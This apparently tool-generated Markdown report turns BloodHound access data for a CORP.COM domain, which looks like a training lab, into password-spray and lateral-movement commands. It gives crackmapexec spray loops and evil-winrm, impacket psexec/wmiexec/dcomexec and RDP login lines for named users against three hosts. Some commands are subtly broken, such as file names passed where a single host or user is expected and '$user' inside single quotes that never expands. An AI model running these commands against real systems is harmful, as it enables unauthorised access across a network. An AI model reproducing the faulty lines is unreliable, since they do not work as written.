# Tailored Spray Commands

Based on BloodHound access relationships - targeted commands for known valid access.

## Summary

- **Users with access:** 7
- **Target machines:** 3
- **Access types:** AdminTo, CanPSRemote, CanRDP, ExecuteDCOM

## Local Admin (AdminTo)

7 users, 3 unique target groups

### Group 1: 2 user(s) → 3 target(s)

**Users:** `administrator, jeffadmin`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)
- `DC1.CORP.COM` (192.168.249.70)
- `FILES04.CORP.COM` (192.168.249.73)

#### File-based commands

```bash
# Create user and target files
echo -e "administrator\njeffadmin" > users_g1.txt
echo -e "192.168.249.74\n192.168.249.70\n192.168.249.73" > targets_g1.txt
crackmapexec smb targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in administrator jeffadmin; do
  for target in 192.168.249.74 192.168.249.70 192.168.249.73; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i 192.168.249.74 -u administrator -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'CORP/administrator:<PASSWORD>'@192.168.249.74
```

```bash
# WMIExec
impacket-wmiexec 'CORP/administrator:<PASSWORD>'@192.168.249.74
```

### Group 2: 2 user(s) → 2 target(s)

**Users:** `jen, leon`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)
- `FILES04.CORP.COM` (192.168.249.73)

#### File-based commands

```bash
# Create user and target files
echo -e "jen\nleon" > users_g2.txt
echo -e "192.168.249.74\n192.168.249.73" > targets_g2.txt
crackmapexec smb targets_g2.txt -u users_g2.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in jen leon; do
  for target in 192.168.249.74 192.168.249.73; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i 192.168.249.74 -u jen -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'CORP/jen:<PASSWORD>'@192.168.249.74
```

```bash
# WMIExec
impacket-wmiexec 'CORP/jen:<PASSWORD>'@192.168.249.74
```

### Group 3: 3 user(s) → 1 target(s)

**Users:** `dave, jeff, stephanie`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)

#### File-based commands

```bash
# Create user and target files
echo -e "dave\njeff\nstephanie" > users_g3.txt
echo -e "192.168.249.74" > targets_g3.txt
crackmapexec smb targets_g3.txt -u users_g3.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in dave jeff stephanie; do
  for target in 192.168.249.74; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i 192.168.249.74 -u dave -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'CORP/dave:<PASSWORD>'@192.168.249.74
```

```bash
# WMIExec
impacket-wmiexec 'CORP/dave:<PASSWORD>'@192.168.249.74
```

## RDP Access (CanRDP)

4 users, 1 unique target groups

### Group 1: 4 user(s) → 1 target(s)

**Users:** `jeff, jeffadmin, jen, leon`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)

#### File-based commands

```bash
# Create user and target files
echo -e "jeff\njeffadmin\njen\nleon" > users_g1.txt
echo -e "192.168.249.74" > targets_g1.txt
xfreerdp /v:targets_g1.txt /u:users_g1.txt /p:'<PASSWORD>' /cert:ignore
```

#### Inline bash loop

```bash
for user in jeff jeffadmin jen leon; do
  for target in 192.168.249.74; do
    xfreerdp /v:$target /u:$user /p:'<PASSWORD>' /cert:ignore
  done
done
```

**Alternative protocols:**

```bash
# rdesktop
rdesktop -u jeff -p '<PASSWORD>' 192.168.249.74
```

## PS Remoting (CanPSRemote)

1 users, 1 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `jeffadmin`

**Targets:**

- `FILES04.CORP.COM` (192.168.249.73)

#### File-based commands

```bash
# Create user and target files
echo -e "jeffadmin" > users_g1.txt
echo -e "192.168.249.73" > targets_g1.txt
evil-winrm -i targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in jeffadmin; do
  for target in 192.168.249.73; do
    evil-winrm -i $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (CrackMapExec)
crackmapexec winrm 192.168.249.73 -u jeffadmin -p '<PASSWORD>'
```

## DCOM Execution (ExecuteDCOM)

1 users, 1 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `jen`

**Targets:**

- `CLIENT74.CORP.COM` (192.168.249.74)

#### File-based commands

```bash
# Create user and target files
echo -e "jen" > users_g1.txt
echo -e "192.168.249.74" > targets_g1.txt
impacket-dcomexec 'CORP/users_g1.txt:<PASSWORD>'@targets_g1.txt
```

#### Inline bash loop

```bash
for user in jen; do
  for target in 192.168.249.74; do
    impacket-dcomexec 'CORP/$user:<PASSWORD>'@$target
  done
done
```

---

> **NOTE:** Replace `<PASSWORD>` with actual credentials.
> Commands are based on BloodHound data - verify access before exploitation.
